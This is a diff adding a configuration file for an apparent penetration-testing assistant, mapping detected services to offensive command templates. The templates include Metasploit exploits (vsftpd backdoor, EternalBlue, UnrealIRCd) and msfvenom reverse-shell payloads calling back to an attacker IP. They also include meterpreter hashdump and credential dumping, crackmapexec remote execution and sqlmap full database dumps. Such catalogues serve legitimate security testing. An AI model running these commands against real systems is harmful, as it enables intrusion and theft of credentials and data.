@@ -1,0 +1,234 @@
+Candidate command list without filter script
+
+[Echidna]
+pattern: Any command since no filter script
+name: exploit vsftpd 2.3.4 vulnerability
+template: python exploit/49757.py {ipv4} {condition}
+template: python exploit/49757.py {host} {condition}
+condition: {".*": ["vsftpd 2.3.4"]}
+group: Exploit Command
+[end]
+
+[Echidna]
+pattern: Any command since no filter script
+name: exploit vsftpd 2.3.4 vulnerability by metasploit
+template: msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set rhosts {ipv4}; exploit"
+template: msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set rhosts {host}; exploit"
+condition: {".*": ["vsftpd 2.3.4"]}
+group: Exploit Command
+[end]
+
+[Echidna]
+pattern: Any command since no filter script
+name: exploit ms17-010 vulnerability
+template: python exploit/42315.py {ipv4}
+template: python exploit/42315.py {host}
+condition: {"vuln": [".*ms17-010.*"]}
+group: Exploit Command
+[end]
+
+[Echidna]
+pattern: Any command since no filter script
+name: exploit ms17-010 vulnerability
+template: msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set rhosts {ipv4}; exploit"
+template: msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set rhosts {host}; exploit"
+condition: {"vuln": [".*ms17-010.*"]}
+group: Exploit Command
+[end]
+
+[Echidna]
+pattern: Any command since no filter script
+name: exploit UnreaIRCD IRC vulnerability (CVE-2010-2075)
+template: msfconsole -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set rhosts {ipv4}; set payload cmd/unix/bind_perl;exploit"
+template: msfconsole -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set rhosts {host}; set payload cmd/unix/bind_perl;exploit"
+condition: {".*": ["UnrealIRCd"]}
+group: Exploit Command
+[end]
+
+[Echidna]
+pattern: smbclient .*
+name: connect shared drive via SMB using smbclient
+template: smbclient -L //{ipv4}
+template: smbclient -L //{host}
+template: smbclient //{host}/{port.SMBDrive}
+template: smbclient //{ipv4}/{port.SMBDrive}
+condition: {".*": ["139", "445", ".*netbios.*", ".*microsoft-ds.*"]}
+group: SMB
+[end]
+
+[Echidna]
+pattern: crackmapexec .*
+name: crackmapexec can execute commands abusing any of mmcexec, smbexec, atexec, wmiexec being wmiexec the default method. Y
+template: crackmapexec smb {ipv4} -u <username> -p <password> -x whoami
+template: crackmapexec smb {host} -u <username> -p <password> -x whoami
+condition: {".*": ["139", "445", ".*netbios.*", ".*microsoft-ds.*"]}
+group: SMB
+[end]
+
+[Echidna]
+pattern: : Any command since no filter script
+name: spawn tty
+template: python -c 'import pty;pty.spawn("/bin/bash")'
+template: echo os.system('/bin/bash')
+template: /bin/sh -i
+template: perl -e 'exec "/bin/sh";'
+template: ruby: exec "/bin/sh"
+condition: {"currenthost": "^(?!.*default).*$"}
+group: Privilege Escalation Command
+[end]
+
+[Echidna]
+name: ftp command
+template: ls
+template: get $filename
+template: put $filename
+template: binary
+template: ascii
+template: mkdir $directoryname
+template: rmdir $directoryname
+condition: {"currenthost": "^(?!.*default).*$", "currentcommand": "ftp"}
+group: FTP Command
+[end]
+
+[Echidna]
+pattern: ftp .*
+pattern: sudo ftp .*
+name: connect via FTP using ftp command
+template: ftp ftp://{port.user}:{port.user.pass}@{host}
+template: ftp ftp://{port.user}@{host}
+template: ftp ftp://{port.user}:{port.user.pass}@{ipv4}
+template: ftp ftp://{port.user}@{ipv4}
+template: ftp anonymous@{host}
+template: ftp anonymous@{ipv4}
+template: ftp {host}
+template: ftp {ipv4}
+condition: {".*": ["ftp", "21"]}
+group: FTP Command
+[end]
+
+[Echidna]
+pattern: any command is fine since no parser script
+name: search exploit code
+template: searchsploit {version}
+template: searchsploit -m {exploitPath}
+condition: {".*": ["exploitPath", "version"]}
+[end]
+
+[Echidna]
+pattern: any command is fine since no parser script
+name: connect to mysql service
+template: mysql -u$username$ -p$password$ -h {host}
+template: mysql -u$username$ -p$password$ -h {ipv4}
+condition: {".*": ["mysql", "3306"]}
+group: MYSQL
+[end]
+
+[Echidna]
+pattern: any command is fine since no parser script
+name: create reverse shell by msfvenom
+template: msfvenom LPORT=4444 -a php --platform php -p php/reverse_php  -o payload.php LHOST=<your_ip>
+template: msfvenom LPORT=4444 -f exe -a x86  -p windows/meterpreter/reverse_tcp LHOST=<your_ip>
+template: msfvenom LPORT=4444 -f elf -p linux/x86/meterpreter/reverse_tcp LHOST=<your_ip>
+template: msfvenom LPORT=4444 -f asp -p windows/meterpreter/reverse_tcp LHOST=<your_ip>
+template: msfvenom LPORT=4444 -f raw -p cmd/unix/reverse_python LHOST=<your_ip>
+group: USEFUL COMMAND
+[end]
+
+[Echidna]
+pattern: any command is fine since no parser script
+name: sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
+template: sqlmap -u {host} --level=5 --risk=3 --dump-all --data "<parameter_id>=id&<parameter_pass>=pass"
+template: sqlmap -u {ipv4} --level=5 --risk=3 --dump-all --data "<parameter_id>=id&<parameter_pass>=pass"
+condition: {".*": ["80", "443", "http", "https"]}
+group: HTTP
+[end]
+
+[Echidna]
+pattern: any command is fine since no parser script
+name: meterpreter shell command
+template: getsystem
+template: getprivs
+template: hashdump
+template: getuid
+template: sysinfo
+template: load kiwi
+template: creds_all
+condition: {"currenthost": "^(?!.*default).*$", "currentcommand": "meterpreter"}
+group: Meterpreter Command
+[end]
+
+[Echidna]
+pattern: any command is fine since no parser script
+name: cewl is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper
+template: cewl {host} > wordlist.txt
+template: cewl {ipv4} > wordlist.txt
+condition: {".*": ["80", "443", "http", "https"]}
+group: HTTP
+[end]
+
+[Echidna]
+pattern:any command is fine since no parser script
+name: checks the available encryption and DoS vulnerability (without causing DoS to the service) and obtains NTLM Windows info (versions).
+template: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {host}
+template: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {ipv4}
+condition: {".*": ["3389", "RDP"]}
+group: RDP
+[end]
+
+[Echidna]
+pattern:any command is fine since no parser script
+name: The rlogin command enables you to log in to other UNIX machines on your network.
+template: rlogin -l root {host} -p {port}
+template: rlogin -l root {ipv4} -p {port}
+condition: {".*": ["512", "513", "514"]}
+group: RLOGIN
+[end]
+
+[Echidna]
+pattern: any command is fine since no parser script
+name: showmount queries the mount daemon on a remote host for information about the state of the NFS server on that machine.
+template: showmount -e {host}
+template: showmount -e {ipv4}
+condition: {".*": ["nfs", "2049"]}
+group: NFS
+[end]
+
+[Echidna]
+pattern: any command is fine since no parser script
+name: connect shared drive via nfs using mount
+template: mount -t nfs {host} /tmp/
+template: mount -t nfs {ipv4} /tmp/
+template: mount -t nfs {host}:<remote_folder> /tmp/
+template: mount -t nfs {ipv4}:<remote_folder> /tmp/
+condition: {".*": ["nfs", "2049"]}
+group: NFS
+[end]
+
+[Echidna]
+pattern: any command is fine since no parser script
+name: Telnet is a network protocol that gives users a UNsecure way to access a computer over a network.
+template: telnet {host} {port}
+template: telnet {ipv4} {port}
+name: Use -vn option for banner grabbing
+template: telnet -vn {host} {port}
+template: telnet -vn {ipv4} {port}
+group: GENERAL ENUM
+[end]
+
+[Echidna]
+pattern: any command is fine since no parser script
+name: Burpsuite
+template: burpsuite &
+group: USEFUL COMMAND
+[end]
+
+[Echidna]
+pattern: any command is fine since no parser script
+name: SSH command
+template: ssh {port.user}@{host}
+template: ssh {port.user}@{ipv4}
+template: ssh {host}
+template: ssh {ipv4}
+condition: {".*": ["ssh", "22"]}
+group: SSH Command
+[end]
